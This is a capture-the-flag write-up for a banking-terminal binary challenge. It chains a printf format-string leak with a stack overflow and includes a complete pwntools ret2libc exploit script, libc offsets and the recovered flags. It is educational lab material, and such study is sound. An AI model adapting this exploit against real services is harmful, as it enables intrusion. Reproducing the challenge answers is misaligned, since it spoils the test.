# Canary Wharf

> Fluid Banking Terminal with every mitigation enabled. The flag lives in `/flag.txt`.
> **Flag:** `flag{b54eaba6982087b6}`

---

## Solution

A dynamically linked banking terminal protected with PIE, stack canary, NX and
Full RELRO. Two bugs in `bank.c` chain together: a format string in
`check_balance()` and a stack overflow in `transfer_funds()`.

### 1. Triage

```bash
$ checksec --file=bank
PIE enabled
Canary found
NX enabled
Full RELRO
SHSTK/IBT reported
```

The challenge ships `bank`, `bank.c`, `libc.so.6`, `ld-linux-x86-64.so.2` and a
`public.zip` protected with the password `infected`.

### 2. The vulnerable code

`check_balance()` prints a user-controlled note directly:

```c
printf(note);
```

`transfer_funds()` reads up to 256 bytes into a 64-byte stack buffer:

```c
char amount[64];
read(0, amount, 256);
```

### 3. Leak canary, PIE and libc

Option 1 reaches the format string. The payload `%25$p|%27$p|%33$p` returns the
canary, a return address inside `bank` (PIE leak) and a libc address.

```bash
$ ./bank
> 1
Enter account memo: %25$p|%27$p|%33$p
```

Offsets computed against the provided libc/ld:

```
pie_base  = leak_27 - 0x15e7
libc_base = leak_33 - 0x29d90
```

### 4. Overflow offset

In `transfer_funds()` the buffer sits at `rbp-0x50` and the canary at
`rbp-0x8`, so the padding is `0x50 - 0x8 = 0x48` (72 bytes).

```text
72 bytes filler | canary | 8 bytes saved RBP | ROP chain
```

### 5. ret2libc

```text
ret        = libc_base + 0x29139
pop rdi    = libc_base + 0x2a3e5
system     = libc_base + 0x50d70
"/bin/sh"  = libc_base + 0x1d8678
```

### 6. Exploit

```python
from pwn import *

HOST = 'b0e1548fade8ca17.chal.ctf.ae'
libc = ELF('libc.so.6', checksec=False)

io = remote(host=HOST, port=443, ssl=True, sni=HOST)
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'Enter account memo: ')
io.sendline(b'%25$p|%27$p|%33$p')
block = io.recvuntil(b'> ')

vals = [l for l in block.split(b'\n') if b'Account Holder:' in l][0]
vals = vals.split(b'Account Holder: ')[1].split(b'|')
canary = int(vals[0], 16)
libc_base = int(vals[2], 16) - 0x29d90

payload  = b'A' * 72 + p64(canary) + b'B' * 8
payload += p64(libc_base + 0x29139)
payload += p64(libc_base + 0x2a3e5)
payload += p64(libc_base + next(libc.search(b'/bin/sh\x00')))
payload += p64(libc_base + libc.symbols['system'])

io.sendline(b'2')
io.recvuntil(b'Enter transfer details: ')
io.send(payload + b'\n')
io.sendline(b'cat /flag.txt')
print(io.recvrepeat(2).decode('latin-1', 'ignore'))
```

### 7. Flag

```text
flag{b54eaba6982087b6}
```

### New instance (current run)

The same exploit against `0add341380608152.chal.ctf.ae:443` returned:

```text
flag{44e4cc23fcea13ef}
```

## Lesson

A format string that only "prints a note" is a full information leak: it hands
over the canary, the PIE base and the libc base, which turns a plain stack
overflow into a reliable ret2libc. Treat every `printf(user_input)` as critical.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
